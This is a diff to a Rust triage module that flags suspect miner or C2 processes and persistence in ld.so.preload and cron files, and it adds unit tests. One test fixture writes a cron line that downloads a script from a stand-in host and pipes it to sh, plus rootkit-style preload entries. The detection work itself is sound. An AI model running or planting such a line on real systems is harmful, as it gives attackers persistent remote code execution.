@@ -2,7 +2,8 @@
 //! does persist its own JSON report under the state dir). Designed to return in
 //! a few seconds on a box pinned at 100% CPU.
 
-use std::path::Path;
+use std::collections::HashMap;
+use std::path::{Path, PathBuf};
 use std::thread::sleep;
 use std::time::Duration;
 
@@ -56,6 +57,7 @@ pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
 
     let conns = netstat::all();
     let by_inode = netstat::by_inode(&conns);
+    let listeners = netstat::Listeners::new(&conns);
 
     let mut suspects: Vec<Suspect> = Vec::new();
     for (&(pid, start), &cum2) in &second {
@@ -71,17 +73,7 @@ pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
         let cwd = proc::cwd(pid);
         let uidn = proc::uid(pid).unwrap_or(0);
         let cmd = proc::cmdline(pid);
-
-        // Outbound connections of this process.
-        let mut out_conns = Vec::new();
-        for ino in proc::socket_inodes(pid) {
-            if let Some(c) = by_inode.get(&ino)
-                && c.state == netstat::ST_ESTABLISHED
-                && !c.remote.is_loopback()
-            {
-                out_conns.push(format!("{}:{}", c.remote, c.remote_port));
-            }
-        }
+        let out_conns = outbound_conns(pid, &by_inode, &listeners);
 
         let (score, hint) = score_process(&st, &exe, deleted, &cwd, &cmd, cpu_pct, &out_conns);
         if score == 0 && cpu_pct < 50.0 {
@@ -145,6 +137,30 @@ pub fn run(state: &State, print: bool) -> Result<TriageSummary> {
     Ok(summary)
 }
 
+/// The connections `pid` opened to a non-loopback peer, as `ip:port`. One a local
+/// listener accepted is left out: its remote port is the client's choice, so a
+/// client connecting from port 4444 must not make a web server look like a miner.
+pub(crate) fn outbound_conns(
+    pid: i32,
+    by_inode: &HashMap<u64, netstat::Conn>,
+    listeners: &netstat::Listeners,
+) -> Vec<String> {
+    proc::socket_inodes(pid)
+        .into_iter()
+        .filter_map(|ino| by_inode.get(&ino))
+        .filter(|c| listeners.outbound(c))
+        .map(|c| format!("{}:{}", c.remote, c.remote_port))
+        .collect()
+}
+
+/// Does an `ip:port` connection go to a mining-pool / C2 port?
+pub(crate) fn to_bad_port(conn: &str) -> bool {
+    conn.rsplit(':')
+        .next()
+        .and_then(|p| p.parse::<u16>().ok())
+        .is_some_and(|p| BAD_OUT_PORTS.contains(&p))
+}
+
 fn score_process(
     st: &proc::ProcStat,
     exe: &str,
@@ -175,6 +191,10 @@ fn score_process(
     {
         score += 20;
     }
+    // A name that is not valid UTF-8: programs do not call themselves that.
+    if st.comm.contains('\u{FFFD}') {
+        score += 20;
+    }
     // kernel-thread-looking name with a real userspace exe.
     if st.comm.starts_with('[') && !exe.is_empty() && st.ppid != 2 {
         score += 40;
@@ -182,9 +202,7 @@ fn score_process(
     }
     // outbound to a mining/C2 port.
     for c in out_conns {
-        if let Some(port) = c.rsplit(':').next().and_then(|p| p.parse::<u16>().ok())
-            && BAD_OUT_PORTS.contains(&port)
-        {
+        if to_bad_port(c) {
             score += 40;
             miner = true;
         }
@@ -243,23 +261,47 @@ fn decide_label(
 }
 
 fn scan_persistence() -> Vec<String> {
+    scan_persistence_in(Path::new("/etc/ld.so.preload"), &proc::persistence_files())
+}
+
+/// What a start-up file that is not read is reported as.
+const UNREAD: &str = "<not read: not a regular file, or too big>";
+
+/// Every entry of the preload file and the suspicious lines of the cron files,
+/// as `path: line`. Files are read through the evidence reader (no symlink, no
+/// FIFO, bounded, invalid UTF-8 kept as U+FFFD), and one that it refuses is a hit
+/// of its own: a stray byte or an odd file type must not hide what is in it.
+fn scan_persistence_in(preload: &Path, files: &[PathBuf]) -> Vec<String> {
     let mut hits = Vec::new();
-    if Path::new("/etc/ld.so.preload").exists()
-        && let Ok(c) = std::fs::read_to_string("/etc/ld.so.preload")
-        && !c.trim().is_empty()
-    {
-        hits.push(format!("/etc/ld.so.preload: {}", c.trim()));
+    if std::fs::symlink_metadata(preload).is_ok() {
+        match crate::evidence::read_small(preload) {
+            Some(c) => hits.extend(
+                c.lines()
+                    .map(str::trim)
+                    .filter(|l| !l.is_empty())
+                    .map(|l| format!("{}: {}", preload.display(), util::ellipsize(l, 100))),
+            ),
+            None => hits.push(format!("{}: {UNREAD}", preload.display())),
+        }
     }
-    for path in proc::persistence_files() {
-        if let Ok(content) = std::fs::read_to_string(&path) {
-            for line in content.lines() {
-                if is_suspicious_cron(line) {
-                    hits.push(format!(
-                        "{}: {}",
-                        path.display(),
-                        util::ellipsize(line.trim(), 100)
-                    ));
-                }
+    for path in files {
+        // The preload file is reported whole above; a directory is not a file.
+        if path == preload || std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir()) {
+            continue;
+        }
+        let Some(content) = crate::evidence::read_small(path) else {
+            if std::fs::symlink_metadata(path).is_ok() {
+                hits.push(format!("{}: {UNREAD}", path.display()));
+            }
+            continue;
+        };
+        for line in content.lines() {
+            if is_suspicious_cron(line) {
+                hits.push(format!(
+                    "{}: {}",
+                    path.display(),
+                    util::ellipsize(line.trim(), 100)
+                ));
             }
         }
     }
@@ -360,4 +402,95 @@ fn print_summary(s: &TriageSummary, cpu_busy_pct: f64) {
         }
     }
     println!("\nnext: review above, then `sn contain` to throttle suspects (reversible).");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn a_stray_byte_or_an_odd_file_does_not_hide_a_cron_foothold() {
+        let dir = tempfile::tempdir().unwrap();
+        let d = dir.path();
+        // A comment with a byte that is not UTF-8, then the malicious line.
+        let tab = d.join("crontab-u");
+        std::fs::write(
+            &tab,
+            b"# caf\xe9\n* * * * * curl -s http://x/y.sh | sh\n0 1 * * * /usr/bin/true\n",
+        )
+        .unwrap();
+        let fifo = d.join("fifo");
+        nix::unistd::mkfifo(&fifo, nix::sys::stat::Mode::from_bits_truncate(0o600)).unwrap();
+        let link = d.join("link");
+        std::os::unix::fs::symlink(&tab, &link).unwrap();
+        let big = d.join("big");
+        std::fs::write(&big, vec![b'#'; 300 * 1024]).unwrap();
+        let sub = d.join("crontabs");
+        std::fs::create_dir(&sub).unwrap();
+        let preload = d.join("ld.so.preload");
+        std::fs::write(&preload, "/usr/lib/x/libhide.so\n\n/tmp/.k.so\n").unwrap();
+
+        let files = [
+            tab.clone(),
+            fifo.clone(),
+            link.clone(),
+            big.clone(),
+            sub,
+            preload.clone(),
+            d.join("gone"),
+        ];
+        // Returns at all: the FIFO is not waited on.
+        let hits = scan_persistence_in(&preload, &files);
+        let show = |p: &Path, rest: &str| format!("{}: {rest}", p.display());
+        assert_eq!(
+            hits,
+            [
+                show(&preload, "/usr/lib/x/libhide.so"),
+                show(&preload, "/tmp/.k.so"),
+                show(&tab, "* * * * * curl -s http://x/y.sh | sh"),
+                show(&fifo, UNREAD),
+                show(&link, UNREAD),
+                show(&big, UNREAD),
+            ]
+        );
+        // No preload file: nothing about it.
+        assert!(scan_persistence_in(&d.join("none"), &[]).is_empty());
+    }
+
+    #[test]
+    fn a_name_that_is_not_utf8_and_a_pool_connection_raise_the_score() {
+        let st = |comm: &str| proc::ProcStat {
+            pid: 10,
+            comm: comm.into(),
+            state: 'S',
+            ppid: 1,
+            utime: 0,
+            stime: 0,
+            starttime: 1,
+        };
+        let plain = score_process(&st("app"), "/srv/app", false, "/srv", &[], 0.0, &[]).0;
+        let odd = score_process(
+            &st("a\u{FFFD}p"),
+            "/srv/a\u{FFFD}p",
+            false,
+            "/srv",
+            &[],
+            0.0,
+            &[],
+        )
+        .0;
+        assert_eq!(odd, plain + 20);
+        let (s, hint) = score_process(
+            &st("app"),
+            "/srv/app",
+            false,
+            "/srv",
+            &[],
+            0.0,
+            &["198.51.100.7:4444".into()],
+        );
+        assert_eq!((s, hint), (plain + 40, Some(Label::Miner)));
+        assert!(to_bad_port("[2001:db8::1]:3333") && to_bad_port("1.2.3.4:14444"));
+        assert!(!to_bad_port("1.2.3.4:443") && !to_bad_port("junk"));
+    }
 }
